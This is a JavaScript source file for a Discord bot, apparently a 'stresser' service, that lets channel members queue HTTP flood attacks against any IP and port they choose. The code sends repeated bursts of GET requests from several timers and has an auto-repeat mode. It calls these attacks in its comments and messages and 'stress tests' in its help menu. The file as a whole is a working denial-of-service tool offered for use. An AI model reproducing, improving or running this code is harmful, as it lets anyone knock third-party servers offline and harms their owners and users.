const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const http = require('http');  // For sending HTTP requests

const bot = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

// ——— SETTINGS ———
const TOKEN = 'TOKEN';
const MAX_QUEUE = 10;
const MAX_THREADS = 100;  // Reduced number of threads
const MAX_DURATION = 300;
const MIN_PACKET_SIZE = 600;
const MAX_PACKET_SIZE = 65000;
const MAX_REQUESTS = 100;  // Reduced requests per thread (previously 1000)

// ——— STATE ———
let attackQueue = [];
let isAttacking = false;
let autoDdos = { active: false, interval: null };

// ——— FUNCTION TO SEND HTTP ATTACKS ———
const sendAttack = (address, port) => {
    for (let i = 0; i < MAX_REQUESTS; i++) {  // More requests per interval
        const options = {
            hostname: address,
            port: port,
            path: '/',
            method: 'GET',
        };

        const req = http.request(options, (res) => {
            // Do nothing with the response
        });

        req.on('error', (err) => {
            // Handle errors (e.g., timeout or server unreachable)
        });

        req.end();
    }
};

// ——— FUNCTION TO START THE ATTACK ———
const startAttack = (address, port, duration) => {
    const endTime = Date.now() + duration * 1000;
    const totalThreads = 10;  // Reduced threads for lower load

    // Start multiple threads (lower concurrency)
    for (let i = 0; i < totalThreads; i++) {
        setInterval(() => {
            if (Date.now() > endTime) return;

            sendAttack(address, port); // Send HTTP attack requests
        }, 100); // Slightly longer interval between requests
    }
};

// ——— PROCESSING ATTACK QUEUE ———
const processQueue = async (message) => {
    if (attackQueue.length === 0) {
        isAttacking = false;
        return;
    }

    const { address, port, duration, user } = attackQueue.shift();
    isAttacking = true;

    message.channel.send(`🚀 **Launching attack on ${address}:${port} for ${duration}s. Requested by ${user}.**`);
    startAttack(address, port, duration);

    setTimeout(() => {
        message.channel.send(`✅ **Attack on ${address}:${port} completed.**`);
        processQueue(message);
    }, duration * 1000);
};

// ——— BOT EVENTS ———
bot.once('ready', () => {
    console.log(`[+] Logged in as ${bot.user.tag}`);
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith('.')) return;
    
    const [command, ...args] = message.content.slice(1).trim().split(/\s+/);

    switch (command) {
        case 'help':
            const helpEmbed = new EmbedBuilder()
                .setColor('DarkRed')
                .setTitle('⚡ TCP Bot Commands')
                .addFields(
                    { name: '.stress <ip> <port> <duration>', value: 'Launch a TCP stress test.' },
                    { name: '.autostress <ip> <port> <duration>', value: 'Continuously attack until stopped.' },
                    { name: '.stopauto', value: 'Stop the auto stress test.' },
                    { name: '.queuelist', value: 'Show queued attacks.' },
                    { name: '.help', value: 'Show this help menu.' },
                )
                .setFooter({ text: 'Made by SYZDARK', iconURL: bot.user.displayAvatarURL() });

            message.reply({ embeds: [helpEmbed] });
            break;

        case 'stress':
            if (args.length !== 3) return message.reply('⚠️ Usage: `.stress <ip> <port> <duration>`');
            
            const [ip, portStr, durStr] = args;
            const port = parseInt(portStr);
            let duration = parseInt(durStr);

            if (isNaN(port) || isNaN(duration)) return message.reply('❌ Invalid port or duration.');

            if (duration > MAX_DURATION) {
                duration = MAX_DURATION;
                message.reply(`⏳ Duration capped at ${MAX_DURATION} seconds.`);
            }

            if (attackQueue.length >= MAX_QUEUE) {
                return message.reply(`🚦 Queue is full (${attackQueue.length}/${MAX_QUEUE}). Please wait.`);
            }

            attackQueue.push({ user: message.author.username, address: ip, port, duration });
            message.reply(`✅ Added to queue at position #${attackQueue.length}.`);

            if (!isAttacking) processQueue(message);
            break;

        case 'autostress':
            if (autoDdos.active) return message.reply('❌ Auto stress test already running. Use `.stopauto` first.');
            if (args.length !== 3) return message.reply('⚠️ Usage: `.autostress <ip> <port> <duration>`');
            
            const [autoIp, autoPortStr, autoDurStr] = args;
            const autoPort = parseInt(autoPortStr);
            let autoDuration = parseInt(autoDurStr);

            if (isNaN(autoPort) || isNaN(autoDuration)) return message.reply('❌ Invalid port or duration.');

            if (autoDuration > MAX_DURATION) {
                autoDuration = MAX_DURATION;
                message.reply(`⏳ Duration capped at ${MAX_DURATION} seconds.`);
            }

            autoDdos.active = true;
            message.reply(`🔄 Auto stress test started on ${autoIp}:${autoPort} every ${autoDuration}s.`);

            autoDdos.interval = setInterval(() => {
                startAttack(autoIp, autoPort, autoDuration);
            }, autoDuration * 1000);
            break;

        case 'stopauto':
            if (!autoDdos.active) return message.reply('❌ No active auto stress test to stop.');

            clearInterval(autoDdos.interval);
            autoDdos.active = false;
            message.reply('🛑 Auto stress test stopped.');
            break;

        case 'queuelist':
            if (!attackQueue.length) {
                message.reply('📭 Queue is empty.');
            } else {
                const list = attackQueue
                    .map((item, idx) => `#${idx + 1}: ${item.user} → ${item.address}:${item.port} for ${item.duration}s`)
                    .join('\n');
                message.reply(`📊 Attack Queue:\n${list}`);
            }
            break;

        default:
            message.reply('❓ Unknown command. Use `.help`');
    }
});

// ——— START BOT ———
bot.login(TOKEN);
